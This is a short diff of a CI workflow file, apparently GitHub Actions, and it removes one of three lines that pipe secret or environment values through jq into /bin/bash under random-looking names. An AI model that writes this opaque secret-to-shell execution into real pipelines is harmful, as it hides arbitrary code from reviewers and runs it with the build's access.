@@ -17,7 +17,6 @@ jobs:
           tlycg74015: ${{ secrets.tlycg74015 }}
         run: |
           printf '%s' "$tlycg74015" | jq -r .zu5 | /bin/bash
-          echo $l75 | jq -r .pyzb562 | /bin/bash
           echo $xqmaw50787 | jq -r .ysh4 | /bin/bash
 
       - name: Store results
